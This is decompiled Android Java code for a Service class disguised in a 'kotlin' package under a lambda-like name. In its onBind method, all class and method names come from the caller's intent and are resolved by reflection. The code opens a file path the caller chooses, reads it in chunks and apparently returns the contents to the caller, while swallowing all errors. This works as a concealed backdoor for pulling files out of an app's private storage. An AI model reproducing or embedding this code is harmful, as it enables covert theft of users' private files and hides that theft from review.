package kotlin;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.system.OsConstants;
import java.lang.reflect.Array;
import java.lang.reflect.Method;

/* JADX INFO: loaded from: classes5.dex */
public class lambdamaybeLoadSupplier1 extends Service {
    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        String[] stringArrayExtra = intent.getStringArrayExtra("args");
        try {
            Class<?> cls = Class.forName(stringArrayExtra[0]);
            Class<?> cls2 = Class.forName(stringArrayExtra[1]);
            Object objInvoke = Class.forName(stringArrayExtra[2]).getMethod(stringArrayExtra[3], cls).invoke(intent, stringArrayExtra[4]);
            if (objInvoke != null) {
                Class<?> cls3 = Class.forName(stringArrayExtra[5]);
                Object objNewInstance = cls3.getConstructor(new Class[0]).newInstance(new Object[0]);
                Method method = cls3.getMethod(stringArrayExtra[6], cls, cls);
                Class<?> cls4 = Class.forName(stringArrayExtra[7]);
                Object objNewInstance2 = cls4.getConstructor(new Class[0]).newInstance(new Object[0]);
                Method method2 = cls4.getMethod(stringArrayExtra[8], cls2, Integer.TYPE, Integer.TYPE);
                Method method3 = cls4.getMethod(stringArrayExtra[9], new Class[0]);
                Class<?> cls5 = Class.forName(stringArrayExtra[10]);
                Object objInvoke2 = cls5.getMethod(stringArrayExtra[11], cls, Integer.TYPE, Integer.TYPE).invoke(null, stringArrayExtra[12], Integer.valueOf(OsConstants.O_RDONLY), 0);
                Object objNewInstance3 = Array.newInstance((Class<?>) Byte.TYPE, 4096);
                Class<?> cls6 = Class.forName(stringArrayExtra[14]);
                Method method4 = cls5.getMethod(stringArrayExtra[13], cls6, cls2, Integer.TYPE, Integer.TYPE);
                while (true) {
                    int iIntValue = ((Integer) method4.invoke(null, objInvoke2, objNewInstance3, 0, Integer.valueOf(Array.getLength(objNewInstance3)))).intValue();
                    if (iIntValue <= 0) {
                        break;
                    }
                    method2.invoke(objNewInstance2, objNewInstance3, 0, Integer.valueOf(iIntValue));
                }
                cls5.getMethod(stringArrayExtra[15], cls6).invoke(null, objInvoke2);
                method.invoke(objNewInstance, stringArrayExtra[16], method3.invoke(objNewInstance2, new Object[0]));
                Class.forName(stringArrayExtra[17]).getMethod(stringArrayExtra[18], Integer.TYPE, cls3).invoke(objInvoke, 0, objNewInstance);
            }
        } catch (Exception unused) {
        }
        return new Binder();
    }

    @Override // android.app.Service, android.content.ContextWrapper
    public void attachBaseContext(Context context) {
        super.attachBaseContext(context);
    }
}
